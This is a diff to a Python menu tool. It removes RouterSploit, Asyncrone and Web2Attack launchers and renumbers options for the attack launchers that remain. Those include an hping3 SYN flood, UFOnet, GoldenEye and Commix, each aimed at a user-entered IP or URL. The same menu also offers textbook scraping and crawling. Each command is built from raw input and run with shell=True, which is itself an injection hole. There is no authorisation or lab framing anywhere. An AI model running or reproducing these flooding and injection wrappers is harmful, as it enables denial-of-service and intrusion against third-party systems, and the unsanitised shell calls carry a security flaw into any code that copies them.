@@ -108,10 +108,6 @@ def find_tool_path(tool_name):
     return path
 
 # Define functions for additional tools
-def run_asyncrone():
-    command = find_tool_path("asyncrone")
-    subprocess.run(command, shell=True)
-
 def run_syn_flood(target_ip):
     command = f"hping3 -S --flood -V {target_ip}"
     subprocess.run(command, shell=True)
@@ -124,20 +120,12 @@ def run_goldeneye(target_url):
     command = f"goldeneye {target_url}"
     subprocess.run(command, shell=True)
 
-def run_routersploit():
-    command = find_tool_path("rsf")
-    subprocess.run(command, shell=True)
-
 def run_websploit():
     command = "websploit"
     subprocess.run(command, shell=True)
 
 def run_commix(target_url):
     command = f"commix --url={target_url}"
-    subprocess.run(command, shell=True)
-
-def run_web2attack():
-    command = find_tool_path("web2attack")
     subprocess.run(command, shell=True)
 
 def display_ui():
@@ -159,18 +147,15 @@ def display_ui():
         [7] Scrape Chinese Textbooks
         [8] Stress Test a Custom URL
         [9] Web Crawling
-        [10] Run Asyncrone
-        [11] Run SYN Flood
-        [12] Run UFOnet
-        [13] Run GoldenEye
-        [14] Run RouterSploit
-        [15] Run WebSploit
-        [16] Run Commix
-        [17] Run Web2Attack
-        [18] Exit
+        [10] Run SYN Flood
+        [11] Run UFOnet
+        [12] Run GoldenEye
+        [13] Run WebSploit
+        [14] Run Commix
+        [15] Exit
         """)
 
-        choice = input("Select the method (1-18): ").strip()
+        choice = input("Select the method (1-15): ").strip()
         ip_address = None
 
         if choice == "1":
@@ -238,34 +223,25 @@ def display_ui():
             print("Starting web crawling...")
             web_crawler(start_url, max_depth)
         elif choice == "10":
-            print("Running Asyncrone...")
-            run_asyncrone()
-        elif choice == "11":
             target_ip = input("Enter the target IP address for SYN Flood: ").strip()
             print(f"Running SYN Flood on {target_ip}...")
             run_syn_flood(target_ip)
-        elif choice == "12":
+        elif choice == "11":
             target_url = input("Enter the target URL for UFOnet: ").strip()
             print(f"Running UFOnet on {target_url}...")
             run_ufo_net(target_url)
-        elif choice == "13":
+        elif choice == "12":
             target_url = input("Enter the target URL for GoldenEye: ").strip()
             print(f"Running GoldenEye on {target_url}...")
             run_goldeneye(target_url)
-        elif choice == "14":
-            print("Running RouterSploit...")
-            run_routersploit()
-        elif choice == "15":
+        elif choice == "13":
             print("Running WebSploit...")
             run_websploit()
-        elif choice == "16":
+        elif choice == "14":
             target_url = input("Enter the target URL for Commix: ").strip()
             print(f"Running Commix on {target_url}...")
             run_commix(target_url)
-        elif choice == "17":
-            print("Running Web2Attack...")
-            run_web2attack()
-        elif choice == "18":
+        elif choice == "15":
             print("Exiting...")
             break
         else:
